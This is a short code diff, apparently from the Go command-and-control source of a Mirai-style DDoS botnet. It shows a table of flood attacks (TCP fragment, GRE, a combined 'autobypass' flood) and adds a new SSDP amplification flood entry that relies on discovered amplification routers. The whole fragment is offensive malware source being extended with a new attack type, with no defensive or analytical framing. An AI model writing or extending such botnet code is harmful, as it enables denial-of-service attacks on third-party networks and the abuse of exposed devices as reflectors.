@@ -165,6 +165,7 @@ var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
 	"tcpfrag":     {45, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP fragment flood"},
 	"asyn":        {46, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "asynchronous GRE flood"},
 	"autobypass":  {47, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19, 24, 25, 31, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104}, "Auto-bypass: combines GRE/TCP/UDP/ICMP/NTP for maximum L3/L4 bypass with raw sockets"},
+	"ssdp":        {48, []uint8{0, 1, 6, 7, 25}, "SSDP amplification flood (UDP 1900) - uses discovered amplification routers"},
 }
 var requiredFlags map[string][]string = map[string][]string{
 	"slowudp":        {"port"},
